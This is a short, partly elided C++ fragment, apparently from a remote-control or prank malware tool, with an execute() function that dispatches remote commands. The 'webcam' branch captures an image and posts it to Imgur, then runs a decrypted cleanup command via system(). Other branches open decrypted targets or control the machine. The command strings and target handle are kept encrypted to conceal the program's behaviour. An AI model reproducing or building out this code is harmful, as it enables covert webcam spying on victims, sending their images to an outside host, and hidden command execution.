...
void execute(const std::string &command) {
  if (command == "webcam") {
    ...
    sleep(2);
    postImageToImgur();
    system(decrypt(locker::command_cleanup,locker::key).c_str());
  }
  if (command == "eject") {
  ...
  if (command == "rick") {
    if (fork() == 0) {
      execlp(command_open.c_str(), command_open.c_str(),
             decrypt(locker::command_rick1, locker::key).c_str());
    }
  }
  if (command == "screen") {
...
std::string getHandle() { return decrypt(locker::target, locker::key); }
